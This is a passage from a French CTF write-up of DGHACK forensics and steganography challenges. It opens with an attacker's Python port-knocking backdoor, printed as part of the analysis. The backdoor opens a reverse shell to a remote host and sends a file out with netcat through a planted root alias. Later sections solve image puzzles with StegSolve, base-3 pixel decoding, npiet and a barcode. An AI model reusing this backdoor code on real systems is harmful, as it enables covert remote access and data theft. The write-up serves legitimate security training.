            if self.status == 'down':
                self.servers = []
                for i in range(3):
                    server = KnockThreadedTCPServer((self.current_ip, self.knock_seq[i]),
                                                    KnockThreadedTCPRequestHandler)
                    server_thread = threading.Thread(target=server.serve_forever)
                    server_thread.daemon = True
                    server_thread.start()
                    self.servers.append(server)
                self.status = 'up'
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False

    def info(self):
        try:
            ports = [server.server_address[1] for server in self.servers]
            print('Backdoor Listening ports: {} {} {}'.format(*ports))
            return True
        except Exception as e:
            print(e)
            return False

    def waitInterrupt(self):
        try:
            global listen_knock
            while 1:
                time.sleep(1)
                # wait sequence
                i = 0
                n = time.time()
                l = len(self.knock_seq)
                for ping in listen_knock:
                    if ping['d'] < (n - 5):  # wait 5s for receive sequence
                        listen_knock.pop(i)
                    # detect the first sequence
                    if ping['p'] == self.knock_seq[0]:
                        if (i + l) <= len(listen_knock):
                            tl = [ping['p']]
                            for k in range(1, len(self.knock_seq)):
                                tl.append(listen_knock[i + k]['p'])

                            if set(self.knock_seq) == set(tl):
                                listen_knock.clear()
                                self.exfiltration()
                                self.payload()
                                break

                    i += 1

        except KeyboardInterrupt:
            print()  # Jumps ^C char
            self.stop()

    def stop(self):
        try:
            if self.status == 'up':
                for server in self.servers:
                    print('Shutdown {}'.format(server.server_address[1]))
                    server.shutdown()
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False

    def payload(self):
        try:
            print('REVERSESHELL: ' + self.revsh_host + ':' + str(self.revsh_port))
            s = socket.socket()
            s.connect((self.revsh_host, self.revsh_port))
            [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
            pty.spawn("/bin/sh")
        except Exception as e:
            return False

    def exfiltration(self):
        try:
            with open("/root/.aliases", "w+") as f:
                f.write('alias exfiltration="nc -vn ' + self.revsh_host + ' 4444 < /vsystem"')
            sp = subprocess.Popen(["/bin/bash", "-c", "source /root/.aliases"])
            sp.communicate()
        except Exception as e:
            print(e)
            return False

if __name__ == '__main__':
    ksrv = backdoor_knock_server('174.10.50.1', [10000, 10001, 10002], '174.10.50.30', 8080)
    ksrv.exfiltration()
    ksrv.start()
    ksrv.info()
    ksrv.waitInterrupt()
```

On voit donc clairement dans la fonction exfiltration que l’attaquant envoie le fichier vsystem dans un netcat d’exfiltration. On cherche donc le fichier et on tombe dessus, sauf qu’il est dans une archive protégée par mot de passe

On retrouve dans la corbeille de root le fichier setup.php du site web, une ligne mentionne le mdp admin ainsi qu’il est utilisé pour protéger l’archive

On débloque alors l’archive et on tombe sur ce fichier png: DGHACK{tres_secret_defense}.png

Pas de flag en première vu mais vu que c’est une image on pense à de la stégano. On passe l’image sur StegSolve et on découvre le flag dans les couches R, G et B.

# STEGANO - Ne jamais renoncer

L’image comporte une suite de pixels étrange qui fait le tour de l’image, avec le logo dghack au centre. Avec binwalk on trouve une image cachée mais rien de particulier à en tirer après l’avoir aussi passé sur StegSolve.

En regardant la valeur des pixels, on se rend compte que il y a 3 valeurs possibles pour chaque couleurs : 0, 192 et 255. Les couleurs sont donc en base3

Voici la conversion en base10 des couleurs codées en base3. On concatène la valeur en base3 du rouge, du vert puis du bleu:

```python
200 (rouge) = 18 
100 (rouge foncé) = 9
001 (bleu foncé) = 1
101 (violet foncé) = 10
202 (rose) = 20
022 (vert d'eau) = 8
222 (blanc) = 26
011 (bleu-vert foncé) = 4
010 (vert-foncé) = 3
220 (jaune) = 24
110 (jaune-foncé) = 12
211 (rose-saumon) = 22
112 (bleu-clair) = 14
122 (bleu-ciel) = 17
002 (bleu) = 2
121 (vert-clair) = 16
020 (vert) = 6
221 (jaune-clair) = 25
212 (lavande) = 23
```

Cela donne le code suivant en base10:

```python
18 18 18 18 18 18 18 18 9 1 20 20 20 20 10 9 1 8 26 8 8 8 4 1 3 24 26 24 12 3 9 20 26 20 20 20 20 20 20 20 10 22 14 4 26 4 4 17 8 9 12 10 2 26 2 2 1 3 4 12 3 4 12 10 2 26 2 2 2 2 2 2 2 1 3 8 4 14 23 1 26 1 1 1 1 1 14 23 17 3 26 3 3 3 3 3 16 6 10 10 23 22 14 10 4 6 26 6 6 3 4 6 26 6 6 6 6 3 4 12 18 2 26 2 2 2 1 3 8 8 4 1 10 2 6 26 6 6 6 3 9 24 24 12 3 16 6 10 6 4 6 26 6 18 9 25 9 1 26 1 1 1 14 16 4 4 17 14 23 1 3 26 3 16 26 16 16 16 16 16 16 16 6 18 25 24 3 24 26 24 20 10 16 16 16 6 18 25 25 24 6 8 16 26 16 16 16 16 16 16 16 6 18 18 18 9 12 6 25 23 26 23 20 18 23 17 26 17 17 17 8 24 6 4 6 18 26 18 9 17 17 17 8 24 6 18 25 25 25 25 25 24 6 8 16 22 26 22 22 22 18 2 23 23 20 18 24 22 14 26 14 14 14 2 20 8 16 26 16 22 10 26 10 23 6 25 26 25 25 25 25 25 25 25 24 20 22 22 22 18 12 10 2 26 2 2 1 3 8 24 20 18 2 23 22 14 4 26 4 12 12 12 25 16 22 10 26 10 23 6 3 4 6 26 6 6 6 3 17 25 9 26 9 9 22 25 23 1 26 1 1 14 16 4 12 3 4 6 26 6 25 26 25 25 24 3 9 9 9 9 22 18 4 4 4 17 1 23 1 26 1 8
```

Ce qui donne ça en ascii si on prend a=1 et z=26

```python
rrrrrrrriattttjiahzhhhdacxzxlcitztttttttjvndzddqhiljbzbbacdlcdljbzbbbbbbbachdnwazaaaaanwqczcccccpfjjwvnjdfzffcdfzffffcdlrbzbbbachhdajbfzfffcixxlcpfjfdfzfriyiazaaanpddqnwaczcpzpppppppfryxcxzxtjpppfryyxfhpzpppppppfrrrilfywzwtrwqzqqqhxfdfrzriqqqhxfryyyyyxfhpvzvvvrbwwtrxvnznnnbthpzpvjzjwfyzyyyyyyyxtvvvrljbzbbachxtrbwvndzdlllypvjzjwfcdfzfffcqyiziivywazaanpdlcdfzfyzyyxciiiivrdddqawazah
```

En enlevant les dupliqués:

```python
riatjiahzhdacxzxlcitztjvndzdqhiljbzbacdlcdljbzbachdnwazanwqczcpfjwvnjdfzfcdfzfcdlrbzbachhdajbfzfcixlcpfjfdfzfriyiazanpdqnwaczcpzpfryxcxzxtjpfryxfhpzpfrilfywzwtrwqzqhxfdfrzriqhxfryxfhpvzvrbwtrxvnznbthpzpvjzjwfyzyxtvrljbzbachxtrbwvndzdlypvjzjwfcdfzfcqyizivywazanpdlcdfzfyzyxcivrdqawazah
```

En effectuant toutes les rotations possibles ainsi que en essayant de casser un possible chiffrement de Vigenère, on se rend compte que ce texte ne veut rien dire

En effectuant plus de recherches, on tombe sur un langage de programmation bizarre: npiet, qui code en utilisant des pixels

On cache le logo du centre avec paint et on essaye de lancer l’image avec npiet mais le code ne marche pas. Après plus de recherches, on se rend compte qu’il faut changer le fond noir en un fond blanc. Cette fois-ci le code fonctionne et nous donne le flag

# STEGANO - Is it art ?

L’image comporte un code barre derrière le logo DGHACK, naturellement on essaye de l’upload sur un tool online pour lire les code-barres. Le code barre est en 2 parties: la première (gauche) donne en base64: DGA{ et l’autre (droite) donne 22}. C’est le flag 🙂
